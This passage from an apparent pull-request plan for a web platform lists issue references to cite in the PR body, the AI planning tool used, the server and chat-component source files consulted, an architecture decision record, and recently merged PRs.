(verb labels + retry lifecycle parent), and `#2925` (Stage 4 chat-UI
bubble components — the file we modify in `interactive-prompt-card.tsx`).

PR body should use:
- `Ref #2853` (parent epic; not a closure)
- `Ref #2925` (Stage 4 parent)

## AI Tools Used

- Plan researched via `skill: soleur:plan` (this run).
- Codebase context loaded from: `apps/web-platform/server/soleur-go-runner.ts`,
  `apps/web-platform/server/permission-callback.ts`,
  `apps/web-platform/server/cc-dispatcher.ts`,
  `apps/web-platform/server/agent-runner-query-options.ts`,
  `apps/web-platform/components/chat/interactive-prompt-card.tsx`,
  `apps/web-platform/components/chat/review-gate-card.tsx`,
  `apps/web-platform/server/domain-leaders.ts`.
- ADR reference: `knowledge-base/engineering/architecture/decisions/ADR-022-sdk-as-router.md`.
- Recent merge context: PRs #2858 (Stage 1+2 SDK-as-router foundation),
  #2901 (Stage 2.12 real-SDK queryFactory), #2902 (Stage 3 WS protocol),
  #2925 (Stage 4 bubble components), #2954 (code-review backlog drain).
